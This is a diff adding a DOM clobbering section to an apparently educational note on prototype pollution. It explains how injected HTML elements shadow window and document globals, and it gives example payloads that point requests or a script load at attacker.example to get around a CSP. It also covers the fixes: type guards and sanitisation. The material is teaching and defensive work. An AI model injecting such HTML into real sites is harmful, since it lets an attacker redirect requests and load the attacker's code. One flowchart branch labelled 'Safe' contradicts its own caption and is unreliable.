@@ -1,6 +1,6 @@
 ---
 title: "Prototype Pollution & DOM Security"
-aliases: ["Prototype Pollution", "DOM Security", "JavaScript Prototype Pollution"]
+aliases: ["Prototype Pollution", "DOM Security", "JavaScript Prototype Pollution", "DOM Clobbering"]
 tags: [tree/offensive, cyber/offensive/web/client-side/prototype, type/technique, difficulty/hard]
 Domain: "[[Client-Side Web Security]]"
 Color: "#DC143C"
@@ -93,6 +93,122 @@ The vulnerability is the **write to the shared prototype**, and it is complete a
 
 **How you'd spot it:** prove the write on its own terms: set a property through `__proto__` and observe it appearing on an unrelated, freshly created object. That demonstration is the finding, whole, and it does not depend on finding impact. Hunt gadgets afterwards as a separate exercise, and state plainly that a gadget-free result is a statement about this dependency set on this date rather than about the application.
 
+## DOM Clobbering: overwriting JavaScript with HTML
+
+Prototype pollution writes to `Object.prototype` by exploiting a merge
+operation. **DOM clobbering** achieves a conceptually similar goal — corrupting
+a JavaScript variable the application relies on — but uses a completely different
+mechanism: it **uses HTML elements to shadow global JavaScript variables** via
+the browser's legacy DOM API.
+
+The browser exposes named elements as properties on the `window` object and on
+`document`. An element with `id="foo"` becomes `window.foo`; a `<form
+name="bar">` becomes `document.bar`. JavaScript code that reads `window.config`
+or `document.baseURL` without first checking whether those properties are already
+set by a DOM element can be clobbered by an attacker who injects HTML into the
+page — even when a Content Security Policy (CSP) blocks all script execution.
+
+### The clobbering mechanism
+
+```html
+<!-- attacker-injected HTML (no <script> required) -->
+<a id="config" href="https://attacker.example/">clobbered</a>
+
+<!-- application code that runs after the injection -->
+<script>
+  // developer assumed window.config would be undefined or a JS object
+  // but the anchor element shadowed it
+  let endpoint = window.config || '/api/default';
+  fetch(endpoint);   // fetches attacker.example instead
+</script>
+```
+
+The `<a>` element with `id="config"` sets `window.config` to the DOM element
+itself. When the application code reads `window.config || '/api/default'`, the
+DOM element is truthy, so `endpoint` is set to the element — which, when
+coerced to a string (by `fetch`), yields its `href` attribute. The attacker
+controls the `href`, and the request goes to their server.
+
+```mermaid
+flowchart TD
+    H["Attacker injects <a id='config' href='...'>"] --> D["window.config is now the DOM element"]
+    D --> R["Application reads window.config → truthy (element, not undefined)"]
+    R --> C{"Code uses window.config as a string?"}
+    C -->|"fetch(window.config)"| X["Request to attacker-controlled URL"]
+    C -->|"eval(window.config.src)"| E["Code execution if src contains script"]
+    C -->|"null check only (if !window.config)"| S["Safe — null check is bypassed by truthy element"]
+```
+
+### Named form elements as a two-level clobber
+
+A single `id` attribute sets a property on `window`. A `<form>` with a `name`
+attribute and an `<input>` inside it with a `name` attribute creates a two-level
+clobber: `document.formName.inputName`:
+
+```html
+<form id="config" name="config">
+  <input id="apiKey" name="apiKey" value="clobbered-key">
+</form>
+```
+
+```javascript
+// code reading a config object property:
+const key = window.config.apiKey;
+// receives the input element, not a string
+// .toString() or string coercion → "[object HTMLInputElement]"
+// but .value → "clobbered-key" if the code accesses .value
+```
+
+Two-level clobbering reaches nested property reads — the same paths that
+prototype pollution uses to bypass object property checks.
+
+### The CSP bypass dimension
+
+The most important context for DOM clobbering is **CSP bypass**. A strict CSP
+that blocks `'unsafe-inline'` scripts, `eval`, and external script sources
+still allows HTML injection (if sanitization is absent or incomplete). An
+attacker who can inject HTML but not execute scripts can use clobbering to
+corrupt variables that a *subsequent same-origin script* reads — turning HTML
+injection into code-path control without ever executing a `<script>` tag of
+their own.
+
+```html
+<!-- CSP: "script-src 'self'" — no inline scripts, no eval -->
+<!-- Attacker's injected HTML: -->
+<a id="CURRENT_USER_CONFIG" href="//attacker.example/config.js"></a>
+
+<!-- Legitimate same-origin script that runs later: -->
+<script src="/app.js">
+// app.js: loads config from window.CURRENT_USER_CONFIG if set
+if (window.CURRENT_USER_CONFIG) {
+    loadConfig(window.CURRENT_USER_CONFIG.href);
+    // loads from attacker.example/config.js
+}
+</script>
+```
+
+The script is legitimate and same-origin; the CSP allows it. The clobbering
+turns HTML injection into a configurable code-fetch that bypasses the script
+restriction.
+
+### Prototype pollution and DOM clobbering: shared root
+
+Both techniques share the same abstract shape: **corrupt a variable or property
+that application code reads as trusted**, so the application executes the
+attacker's value as a code path, a URL, or a security decision. Prototype
+pollution does this through the shared prototype; DOM clobbering does it through
+the browser's DOM-to-window binding. The gadget concept applies equally: the
+attacker provides the corrupt value, and the *application's own code* turns it
+into impact.
+
+The shared defense is also identical: **never read a global variable or object
+property that could be influenced by untrusted HTML without explicit validation**.
+Check that `window.config` is the type your code expects (`typeof window.config
+=== 'object' && !(window.config instanceof Element)`) rather than assuming
+absence-or-JS-object. And sanitize HTML on the way in — a sanitizer that strips
+`id` attributes (or uses an allowlist) prevents element-to-global binding before
+it happens.
+
 ## Security Implications — Detection & Defense
 
 - **Reject dangerous keys** (`__proto__`, `constructor`, `prototype`) when merging or setting properties from untrusted input — the direct fix. Use `Object.create(null)` for maps (no prototype to pollute), or a `Map` instead of a plain object.
@@ -108,6 +224,7 @@ You should now be able to:
 - Explain why writing to `Object.prototype` affects every object, and why a `__proto__` key in untrusted JSON is dangerous.
 - Demonstrate prototype pollution with a benign canary and escalate it via an existing gadget (auth bypass), and detect pollution via inherited (not own) properties.
 - Explain how gadgets turn the pollution primitive into XSS/RCE, why the pollution is invisible in own-properties, and why key rejection, `Object.create(null)`, and prototype freezing are the layered fixes.
+- Explain DOM clobbering — how HTML elements with `id`/`name` attributes shadow `window` and `document` properties — and why it is a CSP bypass vector even when `<script>` injection is blocked; describe the shared root with prototype pollution and the `instanceof Element` type-guard fix.
 
 ---
 > 🔼 Up: [[Client-Side Web Security]]
